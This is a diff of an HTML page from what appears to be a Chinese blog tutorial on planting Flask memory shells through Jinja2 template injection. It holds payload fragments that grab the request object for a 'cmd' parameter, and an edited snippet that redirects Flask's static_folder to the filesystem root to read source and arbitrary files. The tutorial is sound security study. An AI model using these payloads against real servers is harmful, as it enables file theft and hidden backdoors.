@@ -27,7 +27,7 @@
 <meta property="og:description" content="本篇以jinja2 ssti视角研究Flask高版本内存马 拿request对象123__import__(&quot;flask&quot;).request.args.get(&quot;cmd&quot;) #直接从flask拿ur1_for.__globals__[&#x27;request&#x27;]				#从flask的一些函数的__globals__里拿request_ctx.r">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-05-07T13:10:12.000Z">
-<meta property="article:modified_time" content="2025-10-11T10:26:58.650Z">
+<meta property="article:modified_time" content="2025-10-11T12:57:12.099Z">
 <meta property="article:author" content="xiaotian">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="python">
@@ -338,7 +338,7 @@
 
 <p>然后就是对Response对象的更改（有些只做了类型标准，没有初始化的属性就只能改响应对象啦）,但是每次请求都创建新响应对象，所以我觉得这个作用不大，本质上跟生成响应没啥区别</p>
 <h2 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h2><p>改static_folder读任意文件</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">app.static_url_path=<span class="hljs-string">&quot;/static&quot;</span>（访问时需要url加的，这个属性run的时候就确定了，运行时改没用）;app.static_folder=<span class="hljs-string">&quot;/&quot;</span>（这个运行时改有用）   <span class="hljs-comment">#然后static/app.py读源码</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">app.static_url_path=<span class="hljs-string">&quot;/static&quot;</span>（访问时需要url加的，这个属性run的时候就直接注册到路由了，运行时改没用）;app.static_folder=<span class="hljs-string">&quot;/&quot;</span>（这个运行时改有用）;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;flask&#x27;</span>).Flask.static_folder = <span class="hljs-string">&#x27;../../../../../&#x27;</span> (直接修改类静态属性)  <span class="hljs-comment">#然后static/app.py读源码</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">pickle.loads的箱子里会传入app<br></code></pre></td></tr></table></figure>
 
